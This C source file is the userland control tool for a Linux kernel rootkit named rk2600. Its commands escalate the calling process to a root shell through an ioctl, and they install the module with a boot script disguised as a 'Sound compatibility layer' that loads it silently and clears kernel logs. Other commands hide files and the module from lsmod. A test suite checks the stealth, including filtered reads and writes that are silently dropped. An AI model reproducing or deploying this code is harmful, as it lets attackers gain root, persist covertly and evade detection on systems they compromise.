#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "rk2600_protocol.h"

#define EXIT_USAGE 2

/* glibc declares ioctl request as unsigned long, musl as int. */
#ifdef __GLIBC__
typedef unsigned long ioctl_request_t;
#else
typedef int ioctl_request_t;
#endif

#define IOCTL_REQUEST(command) ((ioctl_request_t)(command))

/* ------------------------------------------------------------------ helpers */

static int open_ctl(void)
{
	int fd = open(RK2600_DEVICE_PATH, O_RDWR | O_CLOEXEC);

	if (fd < 0)
		fprintf(stderr, "Cannot open %s: %s\n",
			RK2600_DEVICE_PATH, strerror(errno));
	return fd;
}

static bool name_is_valid(const char *name)
{
	size_t len;

	if (name == NULL || name[0] == '\0') {
		fprintf(stderr, "NAME must not be empty.\n");
		return false;
	}
	len = strlen(name);
	if (len > RK2600_NAME_MAX) {
		fprintf(stderr, "NAME exceeds %u bytes.\n",
			(unsigned)RK2600_NAME_MAX);
		return false;
	}
	if (strchr(name, '/') != NULL) {
		fprintf(stderr, "NAME must be a single entry, not a path.\n");
		return false;
	}
	if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
		fprintf(stderr, "NAME cannot be '.' or '..'.\n");
		return false;
	}
	return true;
}

static int spawn(char *const argv[])
{
	pid_t pid;
	int wst;

	pid = fork();
	if (pid < 0) {
		perror("fork");
		return -1;
	}
	if (pid == 0) {
		execvp(argv[0], argv);
		_exit(127);
	}
	if (waitpid(pid, &wst, 0) < 0) {
		perror("waitpid");
		return -1;
	}
	return (WIFEXITED(wst) && WEXITSTATUS(wst) == 0) ? 0 : -1;
}

static int copy_file(const char *src, const char *dst)
{
	int sfd;
	int dfd;
	char buf[4096];
	ssize_t nr;

	sfd = open(src, O_RDONLY);
	if (sfd < 0) {
		fprintf(stderr, "Cannot open %s: %s\n", src, strerror(errno));
		return -1;
	}
	dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (dfd < 0) {
		fprintf(stderr, "Cannot create %s: %s\n", dst, strerror(errno));
		close(sfd);
		return -1;
	}
	while ((nr = read(sfd, buf, sizeof(buf))) > 0) {
		ssize_t written = 0;

		while (written < nr) {
			ssize_t nw = write(dfd, buf + written,
					   (size_t)(nr - written));

			if (nw <= 0) {
				if (nw == 0)
					errno = EIO;
				fprintf(stderr, "Write error on %s: %s\n",
					dst, strerror(errno));
				close(sfd);
				close(dfd);
				return -1;
			}
			written += nw;
		}
	}
	if (nr < 0)
		fprintf(stderr, "Read error on %s: %s\n", src, strerror(errno));
	close(sfd);
	if (close(dfd) < 0) {
		fprintf(stderr, "Close error on %s: %s\n",
			dst, strerror(errno));
		return -1;
	}
	return nr < 0 ? -1 : 0;
}

static int ensure_dir(const char *path)
{
	char tmp[PATH_MAX];
	char *p;
	size_t len;

	len = strlen(path);
	if (len == 0 || len >= sizeof(tmp))
		return -1;
	memcpy(tmp, path, len + 1);

	for (p = tmp + 1; *p != '\0'; p++) {
		if (*p != '/')
			continue;
		*p = '\0';
		if (mkdir(tmp, 0755) < 0 && errno != EEXIST)
			return -1;
		*p = '/';
	}
	if (mkdir(tmp, 0755) < 0 && errno != EEXIST)
		return -1;
	return 0;
}

/* ---------------------------------------------------------------- commands */

static int cmd_status(void)
{
	struct rk2600_status st;
	int fd;

	memset(&st, 0, sizeof(st));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_STATUS), &st) < 0) {
		fprintf(stderr, "Status request failed: %s\n",
			strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);

	printf("API version  : %u\n", (unsigned)st.api_version);
	printf("Module hidden: %s\n",
	       (st.flags & RK2600_FLAG_HIDDEN) ? "yes" : "no");

	if (st.api_version != RK2600_API_VERSION)
		fprintf(stderr, "Warning: expected API v%u\n",
			(unsigned)RK2600_API_VERSION);
	return 0;
}

static int cmd_privesc(void)
{
	int fd;

	fd = open_ctl();
	if (fd < 0)
		return -1;

	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_ELEVATE)) < 0) {
		fprintf(stderr, "Elevation failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);

	if (geteuid() != 0) {
		fprintf(stderr, "Elevation failed: still euid=%ld\n",
			(long)geteuid());
		return -1;
	}

	execlp("/bin/sh", "sh", (char *)NULL);
	perror("exec /bin/sh");
	return -1;
}

static int cmd_hide(const char *name)
{
	struct rk2600_name_request req;
	int fd;

	memset(&req, 0, sizeof(req));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	strncpy(req.name, name, RK2600_NAME_MAX);
	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_HIDE), &req) < 0) {
		fprintf(stderr, "Hide failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);
	printf("Hidden: %s\n", name);
	return 0;
}

static int cmd_unhide(const char *name)
{
	struct rk2600_name_request req;
	int fd;

	memset(&req, 0, sizeof(req));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	strncpy(req.name, name, RK2600_NAME_MAX);
	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_UNHIDE), &req) < 0) {
		fprintf(stderr, "Unhide failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);
	printf("Unhidden: %s\n", name);
	return 0;
}

static int cmd_install(const char *ko_path)
{
	struct utsname uts;
	char dir[PATH_MAX];
	char dest[PATH_MAX + sizeof(RK2600_MODULE_FILE)];
	FILE *fp;

	if (geteuid() != 0) {
		fprintf(stderr, "Install requires root.\n");
		return -1;
	}
	if (access(RK2600_DEVICE_PATH, F_OK) == 0) {
		fprintf(stderr,
			"rk2600 is already loaded; uninstall it before reinstalling.\n");
		return -1;
	}
	if (access(ko_path, R_OK) < 0) {
		fprintf(stderr, "Cannot read %s: %s\n",
			ko_path, strerror(errno));
		return -1;
	}
	if (uname(&uts) < 0) {
		perror("uname");
		return -1;
	}

	snprintf(dir, sizeof(dir), "/lib/modules/%s/extra", uts.release);
	if (ensure_dir(dir) < 0) {
		fprintf(stderr, "Cannot create %s: %s\n",
			dir, strerror(errno));
		return -1;
	}

	snprintf(dest, sizeof(dest), "%s/%s", dir, RK2600_MODULE_FILE);
	printf("Copying %s -> %s\n", ko_path, dest);
	if (copy_file(ko_path, dest) < 0)
		return -1;

	if (ensure_dir(RK2600_PERSIST_DIR) < 0) {
		fprintf(stderr, "Cannot create %s\n", RK2600_PERSIST_DIR);
		return -1;
	}

	fp = fopen(RK2600_PERSIST_PATH, "w");
	if (!fp) {
		fprintf(stderr, "Cannot create %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
		return -1;
	}
	if (fprintf(fp,
		"#!/bin/sh\n"
		"# Sound compatibility layer\n"
		"printk_lvl=$(cat /proc/sys/kernel/printk | cut -f1)\n"
		"echo 1 > /proc/sys/kernel/printk\n"
		"/sbin/insmod %s 2>/dev/null\n"
		"echo \"$printk_lvl\" > /proc/sys/kernel/printk\n"
		"dmesg -c > /dev/null 2>&1\n",
		dest) < 0) {
		fprintf(stderr, "Cannot write %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
		fclose(fp);
		return -1;
	}
	if (fclose(fp) < 0) {
		fprintf(stderr, "Cannot close %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
		return -1;
	}
	if (chmod(RK2600_PERSIST_PATH, 0755) < 0) {
		fprintf(stderr, "Cannot chmod %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
		return -1;
	}
	printf("Persistence: %s\n", RK2600_PERSIST_PATH);

	{
		char *rcupdate_argv[] = {
			"rc-update", "add", "local", "default", NULL
		};
		if (spawn(rcupdate_argv) < 0) {
			fprintf(stderr, "Cannot enable the OpenRC local service.\n");
			return -1;
		}
	}

	printf("Loading module...\n");
	{
		char *insmod_argv[] = {"insmod", dest, NULL};

		if (spawn(insmod_argv) < 0) {
			fprintf(stderr, "Cannot load %s.\n", dest);
			return -1;
		}
	}

	printf("Installed.\n");
	return 0;
}

static int cmd_uninstall(void)
{
	struct utsname uts;
	char dest[PATH_MAX];
	int fd;

	if (geteuid() != 0) {
		fprintf(stderr, "Uninstall requires root.\n");
		return -1;
	}

	/* Unhide module so rmmod can find it */
	fd = open(RK2600_DEVICE_PATH, O_RDWR | O_CLOEXEC);
	if (fd >= 0) {
		if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_MODSHOW)) < 0) {
			fprintf(stderr, "Cannot reveal module: %s\n", strerror(errno));
			close(fd);
			return -1;
		}
		close(fd);
		{
			char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};

			if (spawn(rmmod_argv) < 0) {
				fprintf(stderr, "Cannot unload module; files were kept.\n");
				return -1;
			}
		}
	}

	if (uname(&uts) == 0) {
		snprintf(dest, sizeof(dest),
			 "/lib/modules/%s/extra/%s",
			 uts.release, RK2600_MODULE_FILE);
		if (unlink(dest) < 0 && errno != ENOENT)
			fprintf(stderr, "Cannot remove %s: %s\n",
				dest, strerror(errno));
	}

	if (unlink(RK2600_PERSIST_PATH) < 0 && errno != ENOENT)
		fprintf(stderr, "Cannot remove %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));

	printf("Uninstalled.\n");
	return 0;
}

/* ------------------------------------------------------------------- test */

static void run_show(const char *label, const char *cmd)
{
	int ret;

	printf("\n[%s]\n$ %s\n", label, cmd);
	fflush(stdout);
	ret = system(cmd);
	if (ret == -1)
		perror("system");
}

static int run_test(const char *label, const char *cmd, bool expect_fail)
{
	int ret;
	int ok;

	printf("\n[%s]\n$ %s\n", label, cmd);
	fflush(stdout);
	ret = system(cmd);
	ret = WIFEXITED(ret) ? WEXITSTATUS(ret) : 1;
	ok = expect_fail ? (ret != 0) : (ret == 0);
	printf("=> %s\n", ok ? "PASS" : "FAIL");
	return ok ? 0 : 1;
}

static int cmd_test(const char *self)
{
	char cmd[512];
	int pass = 0;
	int total = 0;
	int fd;

	printf("=== rk2600 test suite ===\n");

	/* Abort instead of turning missing prerequisites into false positives. */
	if (run_test("Prerequisites: commands",
		"command -v lsmod >/dev/null && command -v grep >/dev/null && "
		"command -v cat >/dev/null", false) != 0)
		return 1;
	if (run_test("Prerequisites: persistence file",
		"test -f " RK2600_PERSIST_PATH, false) != 0)
		return 1;
	if (run_test("Prerequisites: persistence directory",
		"test -d " RK2600_PERSIST_DIR, false) != 0)
		return 1;

	/* Privilege escalation — first, to get root for remaining tests */
	run_show("Privesc: before", "id");

	printf("\n[Privesc: elevate]\n");
	printf("$ ioctl(%s, RK2600_IOC_ELEVATE)\n", RK2600_DEVICE_PATH);
	fflush(stdout);
	total++;
	fd = open_ctl();
	if (fd >= 0) {
		if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_ELEVATE)) == 0 &&
		    geteuid() == 0) {
			printf("=> PASS\n");
			pass++;
		} else {
			printf("=> FAIL\n");
		}
		close(fd);
	} else {
		printf("=> FAIL\n");
	}

	run_show("Privesc: after", "id");

	/* Status */
	snprintf(cmd, sizeof(cmd), "%s status", self);
	total++; pass += (run_test("Status", cmd, false) == 0);

	/* Module hiding */
	total++; pass += (run_test("Module hiding",
		"lsmod | grep rk2600", true) == 0);

	/* File hiding */
	total++; pass += (run_test("Hide: snd-compat.start",
		"ls /etc/local.d/ | grep snd-compat", true) == 0);

	total++; pass += (run_test("Hide: /proc/.rk",
		"ls -a /proc/ | grep '^\\.rk$'", true) == 0);

	total++; pass += (run_test("Hide: /dev/.rk_ctl",
		"ls -a /dev/ | grep '\\.rk_ctl'", true) == 0);

	/* Direct access (hidden but still accessible) */
	total++; pass += (run_test("Access: " RK2600_DEVICE_PATH,
		"test -c " RK2600_DEVICE_PATH, false) == 0);

	total++; pass += (run_test("Access: " RK2600_PROC_PATH,
		"test -e " RK2600_PROC_PATH, false) == 0);

	/* Read filter */
	run_show("Read: content", "cat " RK2600_PERSIST_PATH);

	total++; pass += (run_test("Read: insmod filtered",
		"cat " RK2600_PERSIST_PATH " | grep insmod", true) == 0);

	/* The write must report success and the marker must remain absent. */
	total++; pass += (run_test("Write: success reported and data dropped",
		"echo 'RK_TEST_42' >> " RK2600_PERSIST_PATH
		" && ! grep RK_TEST_42 " RK2600_PERSIST_PATH, false) == 0);

	/* Dynamic hide/unhide */
	if (run_test("Dynamic fixture creation",
		"touch /test_rk_hide 2>/dev/null", false) != 0)
		return 1;

	snprintf(cmd, sizeof(cmd),
		"%s hide test_rk_hide >/dev/null 2>&1; "
		"ls / | grep test_rk_hide", self);
	total++; pass += (run_test("Dynamic hide", cmd, true) == 0);

	snprintf(cmd, sizeof(cmd),
		"%s unhide test_rk_hide >/dev/null 2>&1; "
		"ls / | grep test_rk_hide", self);
	total++; pass += (run_test("Dynamic unhide", cmd, false) == 0);

	if (system("rm -f /test_rk_hide 2>/dev/null") == -1)
		perror("cleanup test fixture");

	/* Summary */
	printf("\n=== Results: %d/%d passed ===\n", pass, total);

	return (pass == total) ? 0 : 1;
}

/* ------------------------------------------------------------------- main */

static void print_usage(FILE *out, const char *prog)
{
	fprintf(out,
		"Usage: %s <command> [args]\n"
		"\n"
		"Commands:\n"
		"  install [ko]   Install module and set up persistence\n"
		"  uninstall      Remove module and persistence\n"
		"  status         Show module status\n"
		"  privesc        Elevate to root shell\n"
		"  hide <name>    Hide a directory entry\n"
		"  unhide <name>  Reveal a directory entry\n"
		"  test           Run feature test suite\n",
		prog);
}

int main(int argc, char **argv)
{
	const char *cmd;

	if (argc < 2) {
		print_usage(stderr, argv[0]);
		return EXIT_USAGE;
	}

	cmd = argv[1];

	if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
		print_usage(stdout, argv[0]);
		return 0;
	}

	if (strcmp(cmd, "status") == 0) {
		if (argc != 2) {
			fprintf(stderr, "status takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_status() == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "privesc") == 0) {
		if (argc != 2) {
			fprintf(stderr, "privesc takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_privesc() == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "hide") == 0) {
		if (argc != 3) {
			fprintf(stderr, "hide requires exactly one NAME.\n");
			return EXIT_USAGE;
		}
		if (!name_is_valid(argv[2]))
			return EXIT_USAGE;
		return cmd_hide(argv[2]) == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "unhide") == 0) {
		if (argc != 3) {
			fprintf(stderr, "unhide requires exactly one NAME.\n");
			return EXIT_USAGE;
		}
		if (!name_is_valid(argv[2]))
			return EXIT_USAGE;
		return cmd_unhide(argv[2]) == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "install") == 0) {
		if (argc > 3) {
			fprintf(stderr, "install takes at most one argument.\n");
			return EXIT_USAGE;
		}
		{
			const char *ko = (argc == 3)
				? argv[2] : "./" RK2600_MODULE_FILE;
			return cmd_install(ko) == 0 ? 0 : 1;
		}
	}

	if (strcmp(cmd, "uninstall") == 0) {
		if (argc != 2) {
			fprintf(stderr, "uninstall takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_uninstall() == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "test") == 0) {
		if (argc != 2) {
			fprintf(stderr, "test takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_test(argv[0]) == 0 ? 0 : 1;
	}

	fprintf(stderr, "Unknown command: %s\n", cmd);
	print_usage(stderr, argv[0]);
	return EXIT_USAGE;
}
